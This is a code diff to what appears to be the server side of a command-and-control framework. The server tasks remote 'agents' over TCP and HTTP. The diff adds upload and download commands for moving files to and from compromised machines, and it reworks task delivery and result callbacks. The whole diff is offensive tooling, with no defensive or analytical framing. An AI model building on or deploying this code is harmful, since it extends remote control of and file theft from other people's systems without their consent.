@@ -120,12 +120,12 @@ def handle_interact(conn, id):
         tcp.send_data(conn, id, header)
         
         while True:
-            _, raw = tcp.recv_data(conn)
+            _, raw = tcp.recv_data(conn, binary=True)
             if raw is None:
                 print(f"[!] Connection closed.")
                 break
 
-            cmd = raw.strip().split()
+            cmd = raw.decode(errors="ignore").strip().split()
             if not cmd:
                 continue
 
@@ -166,6 +166,24 @@ def handle_interact(conn, id):
                     response = commands.module(agent, arg, conn_type)
                     tcp.send_data(conn, response)
                     
+                case ["upload"]:
+                    response = commands.upload_help()
+                    tcp.send_data(conn, response)
+                    
+                case ["upload", *arg]:
+                    arg = raw.split(maxsplit=1)[1]
+                    response = commands.upload(agent, arg, conn_type)
+                    tcp.send_data(conn, response)
+                    
+                case ["download"]:
+                    response = commands.download_help()
+                    tcp.send_data(conn, response)
+                    
+                case ["download", *arg]:
+                    arg = raw.split(maxsplit=1)[1]
+                    response = commands.download(agent, arg, conn_type)
+                    tcp.send_data(conn, response)
+                    
                 case ["exit"]:
                     return commands.exit()
                     
@@ -179,7 +197,7 @@ def handle_interact(conn, id):
                     tcp.send_data(conn, response)
 
 
-    except Exception:
+    except Exception as e:
         agent.status = "dead"
         if agent.conn_type == "tcp":
             tcp.close(agent.conn)
@@ -227,9 +245,8 @@ def handle_task():
     
     header = task.header
 
-    if task.command in commands.MODULE_FILES:
-        module = commands.module_maker(task.command)
-        return http.generate_response(task.id, module, header)
+    if task.data:
+        return http.generate_response(task.id, task.data, header)
     
     return http.generate_response(task.id, task.command, header)
     
@@ -249,7 +266,7 @@ def handle_result():
     if not task:
         return http.generate_response(data="None",status=400)
 
-    result = commands.module_handler(agent_id, header, "http", result, task_id)
+    result = commands.callback_handler(agent_id, header, "http", response=result, task=task)
 
     if not taskmng.mark_task_done(agent_id, task_id.decode(), header.decode(), result.decode()):
         return http.generate_response(data="None",status=400)
